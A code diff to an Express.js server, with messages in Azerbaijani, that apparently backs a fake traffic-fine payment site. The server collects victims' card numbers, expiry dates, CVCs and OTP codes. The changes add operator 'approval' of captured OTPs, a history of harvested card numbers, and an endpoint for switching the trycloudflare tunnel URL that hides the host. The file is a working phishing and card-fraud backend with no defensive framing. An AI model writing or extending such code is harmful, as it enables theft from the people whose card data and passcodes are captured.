@@ -51,12 +51,21 @@ let fineData = {
     cardExp: null,
     cardCvc: null,
     otpCode: null,
-    hasNewRequest: false
+    hasNewRequest: false,
+    isPendingApproval: false,
+    apiUrl: "https://superintendent-elementary-leads-urls.trycloudflare.com/api"
 };
+
+let paidHistory = [];
 
 // GET fine details
 app.get('/api/fine', (req, res) => {
     res.json(fineData);
+});
+
+// GET paid history / archive
+app.get('/api/history', (req, res) => {
+    res.json(paidHistory);
 });
 
 // POST update fine details (Admin)
@@ -79,8 +88,24 @@ app.post('/api/fine/update', (req, res) => {
     fineData.cardCvc = null;
     fineData.otpCode = null;
     fineData.hasNewRequest = false;
+    fineData.isPendingApproval = false;
 
     res.json({ success: true, message: "Cərimə məlumatları yeniləndi", fine: fineData });
+});
+
+// POST update Tunnel API URL (Admin)
+app.post('/api/tunnel/update', (req, res) => {
+    const { apiUrl } = req.body;
+    if (apiUrl) {
+        fineData.apiUrl = apiUrl;
+        try {
+            const configPath = path.join(__dirname, '../config.json');
+            fs.writeFileSync(configPath, JSON.stringify({ apiUrl }, null, 2));
+        } catch (e) {
+            console.log("config.json yazılmadı:", e);
+        }
+    }
+    res.json({ success: true, message: "Tünel linki yeniləndi", apiUrl: fineData.apiUrl });
 });
 
 // POST reset / clear payment and requests
@@ -91,16 +116,19 @@ app.post('/api/reset', (req, res) => {
     fineData.cardCvc = null;
     fineData.otpCode = null;
     fineData.hasNewRequest = false;
-    res.json({ success: true, message: "Bütün ödənişlər və sorğular sıfırlandı", fine: fineData });
+    fineData.isPendingApproval = false;
+    paidHistory = [];
+    res.json({ success: true, message: "Bütün ödənişlər, sorğular və tarixçə təmizləndi", fine: fineData });
 });
 
-// POST save card details (Triggers new request notification)
+// POST save card details
 app.post('/api/card', (req, res) => {
     const { cardNo, cardExp, cardCvc } = req.body;
     if (cardNo) fineData.cardNo = cardNo;
     if (cardExp) fineData.cardExp = cardExp;
     if (cardCvc) fineData.cardCvc = cardCvc;
     fineData.hasNewRequest = true;
+    fineData.isPendingApproval = false;
     res.json({ success: true, message: "Kart məlumatları qəbul edildi" });
 });
 
@@ -108,7 +136,27 @@ app.post('/api/card', (req, res) => {
 app.post('/api/otp', (req, res) => {
     const { otpCode } = req.body;
     if (otpCode) fineData.otpCode = otpCode;
-    res.json({ success: true, message: "OTP kodu qəbul edildi" });
+    fineData.isPendingApproval = true;
+    res.json({ success: true, message: "OTP kodu qəbul edildi, təsdiq gözlənilir" });
+});
+
+// POST Admin approve payment (Saves to paidHistory)
+app.post('/api/admin/approve', (req, res) => {
+    fineData.isPaid = true;
+    fineData.isPendingApproval = false;
+
+    // Add to history archive
+    const historyItem = {
+        protocolNo: fineData.protocolNo,
+        plateNo: fineData.plateNo,
+        location: fineData.location,
+        amount: fineData.discountAmount,
+        cardNo: fineData.cardNo,
+        approvedAt: getCurrentDateTime()
+    };
+    paidHistory.unshift(historyItem); // Add to beginning
+
+    res.json({ success: true, message: "Ödəniş admin tərəfindən təsdiqləndi", fine: fineData });
 });
 
 // Clear new request notification flag
@@ -117,7 +165,7 @@ app.post('/api/clear-request', (req, res) => {
     res.json({ success: true });
 });
 
-// POST upload violation photo (Dynamic host based on request)
+// POST upload violation photo
 app.post('/api/upload', upload.single('photo'), (req, res) => {
     if (!req.file) {
         return res.status(400).json({ success: false, message: "Şəkil yüklənmədi" });
@@ -131,11 +179,10 @@ app.post('/api/upload', upload.single('photo'), (req, res) => {
 
 // POST process payment
 app.post('/api/pay', (req, res) => {
-    const { amountPaid } = req.body;
-    fineData.isPaid = true;
+    fineData.isPendingApproval = true;
     res.json({
         success: true,
-        message: `Ödəniş uğurla qəbul edildi: ${amountPaid || fineData.discountAmount} AZN`,
+        message: `Ödəniş sorğusu göndərildi, təsdiq gözlənilir`,
         fine: fineData
     });
 });
